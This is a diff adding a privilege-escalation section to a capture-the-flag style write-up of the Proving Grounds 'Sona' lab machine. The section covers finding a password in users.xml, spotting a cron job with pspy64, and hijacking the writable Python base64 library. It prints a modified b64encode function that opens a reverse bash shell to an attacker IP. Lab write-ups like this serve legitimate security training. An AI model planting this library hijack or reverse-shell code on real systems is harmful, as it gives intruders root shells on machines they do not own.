@@ -78,6 +78,51 @@ Cookie: NX-ANTI-CSRF-TOKEN=0.8796302472416133; NXSESSIONID=57be5cd0-1f1f-4ead-b7
 ```
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Sona/Sona%2C%20September%2019%2C%202021_15h55m25s.png)
 
+#### Escalation 
+
+We find the users.xml contains the user sona's password.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Sona/Sona%2C%20September%2019%2C%202021_16h26m43s.png)
+
+We use pspy64 to check any cronjon is running.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Sona/Sona%2C%20September%2019%2C%202021_16h35m34s.png)
+
+The file can't be modified.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Sona/Sona%2C%20September%2019%2C%202021_16h42m43s.png)
+
+Checking the code. It imports base64 libray and the libray file can be modified.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Sona/Sona%2C%20September%2019%2C%202021_16h47m39s.png)
+
+We modify the b64encode function in the ```https://raw.githubusercontent.com/python/cpython/3.8/Lib/base64.py``` and then uploading and copying to ```/usr/lib/python3.8/base64.py```.
+
+```
+def b64encode(s, altchars=None):
+    """Encode the bytes-like object s using Base64 and return a bytes object.
+
+    Optional altchars should be a byte string of length 2 which specifies an
+    alternative alphabet for the '+' and '/' characters.  This allows an
+    application to e.g. generate url or filesystem safe Base64 strings.
+    """
+    #!/usr/bin/python3
+    from os import dup2
+    from subprocess import run
+    import socket
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("192.168.49.130",80)) 
+    dup2(s.fileno(),0) 
+    dup2(s.fileno(),1) 
+    dup2(s.fileno(),2) 
+    run(["/bin/bash","-i"])
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Sona/Sona%2C%20September%2019%2C%202021_23h41m18s.png)
+
+Waiting for schedule to start.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Sona/Sona%2C%20September%2019%2C%202021_23h47m57s.png)
 
 
 
